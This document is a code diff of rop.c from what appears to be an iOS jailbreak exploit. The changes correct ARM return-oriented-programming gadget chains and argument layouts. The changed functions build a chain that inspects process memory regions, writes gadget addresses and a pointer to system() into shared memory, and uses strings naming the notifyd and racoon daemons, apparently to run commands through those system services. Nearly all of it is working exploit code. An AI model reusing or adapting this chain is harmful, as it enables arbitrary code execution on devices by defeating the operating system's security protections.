@@ -1,16 +1,5 @@
-<<<<<<< HEAD
-=======
-/*
- * rop.c
- *
- *  Created on: Jan 12, 2012
- *      Author: posixninja
- */
-
->>>>>>> 4bceb95661329a5c0ad2aca39280bca49f6d6caf
 #include <stdlib.h>
 #include <stdio.h>
-#ifdef __APPLE__
 #include <unistd.h>
 #include <string.h>
 #include <syslog.h>
@@ -289,14 +278,14 @@ void ropSaveReg0(Addr toAddr) {
 
 #define ROP_MOV_REG0_REG_1_LEN 0xc
 void ropMovReg0Reg1() {
-        ropWrite(dscs + GADGET_MOV_R1_R0__POP_R47);
+        ropWrite(dscs + GADGET_MOV_R0_R1__POP_R47);
         ropWrite(USELESS);
         ropWrite(USELESS);
 }
 
 #define ROP_MOV_REG1_REG_0_LEN 0xc
 void ropMovReg1Reg0() {
-        ropWrite(dscs + GADGET_MOV_R0_R1__POP_R47);
+        ropWrite(dscs + GADGET_MOV_R1_R0__POP_R47);
         ropWrite(USELESS);
         ropWrite(USELESS);
 }
@@ -315,9 +304,10 @@ void ropMovReg1Reg4() {
         ropWrite(USELESS);
 }
 
-#define ROP_ADD_REG0_REG_1_LEN 0xc
+#define ROP_ADD_REG0_REG_1_LEN 0x10
 void ropAddReg0Reg1() {
         ropWrite(dscs + GADGET_ADD_R0_R0_R1__POP457);
+        ropWrite(USELESS);
         ropWrite(USELESS);
         ropWrite(USELESS);
 }
@@ -348,9 +338,9 @@ void ropSwapReg0Reg1() {
 }
 
 void ropAddReg0Const(unsigned int value) {
-	ropLoadReg4Const(value);
-        ropMovReg0Reg4();
-        ropSubReg0Reg1();
+        ropMovReg1Reg0();
+	ropLoadReg0Const(value);
+        ropAddReg0Reg1();
 }
 
 void ropSubReg0Const(unsigned int value) {
@@ -393,9 +383,10 @@ void ropStoreValue(Addr addr, unsigned int value) {
 
 void ropCall4Reg(Addr addr) {
 	ropLoadReg4Const(addr);
-	ropWrite(dscs + LIBC_BLX_R4_POP_R47);	// 0x0c pc
+	ropWrite(dscs + LIBC_BLX_R4_POP_R457);	// 0x0c pc
 	ropWrite(USELESS);			// 0x10 r4
-	ropWrite(USELESS);			// 0x14 r7
+	ropWrite(USELESS);			// 0x14 r5
+	ropWrite(USELESS);			// 0x18 r7
 }
 
 void ropCall7(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4, unsigned int p5, unsigned int p6, unsigned int p7) {
@@ -405,10 +396,10 @@ void ropCall7(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsi
 	ropWrite(p3);				// 0x0c r2
 	ropWrite(p4);				// 0x10 r3
 	ropLoadReg4Const(addr);
-	ropWrite(dscs + LIBC_BLX_R4_POP_R47);	// 0x20 pc		// pod2g: I guess this gadget has to be changed
+	ropWrite(dscs + LIBC_BLX_R4_POP_R457);	// 0x20 pc		// pod2g: I guess this gadget has to be changed
 	ropWrite(p5);				// 0x24 r4 (and p5)
-	ropWrite(p6);				// 0x28 r7 (and p6)
-	ropWrite(p7);				// 0x2c p7
+	ropWrite(p6);				// 0x28 r5 (and p6)
+	ropWrite(p7);				// 0x2c r7 (and p7)
 }
 
 void ropCall6(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4, unsigned int p5, unsigned int p6) {
@@ -506,7 +497,7 @@ int ropMain(int slide) {
             ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x04); // aPid to first PLACE_HOLDER
             ropLoadReg0(aRegion);
             ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aRegion to second PLACE_HOLDER
-            ropCall5(dscs + _dsc_proc_pidinfo, PLACE_HOLDER, PROC_PIDREGIONPATHINFO, PLACE_HOLDER, aRegionInfo, sizeof(struct proc_regionwithpathinfo));
+            ropCall6(dscs + _dsc_proc_pidinfo, PLACE_HOLDER, PROC_PIDREGIONPATHINFO, PLACE_HOLDER, 0, aRegionInfo, sizeof(struct proc_regionwithpathinfo));
             ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_address));
             ropSaveReg0(aRegions + (sizeof(uint32_t) * ((i * 3) + 0)));
             ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_protection));
@@ -626,9 +617,9 @@ int ropMain(int slide) {
 
         ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x0C, dscs + _dsc_exit);
         ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x1C, dscs + GADGET_MOV_LR_R4_MOV_R0_LR_POP47);
-        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x28, dscs + GADGET_POP0123PC);
+        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x28, dscs + LIBC_POP_R0123);
         ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x2C, aNotifydStringAddress);
-        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x3C, dscs + _dsc_system);
+        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x3C, dscs + _dsc_system);
 
         ropLoadReg0(aRacoonStringAddress);
         ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonStringAddress to PLACE_HOLDER
@@ -656,10 +647,6 @@ int ropMain(int slide) {
 	ropCall1(dscs + _dsc_exit, 0);
 
 	ropClose();
+
+        return 0;
 }
-#else
-int ropMain(int slide) {
-	fprintf(stderr, "ERROR: ROP stuff not supported on this system.\n");
-	return 0;
-}
-#endif
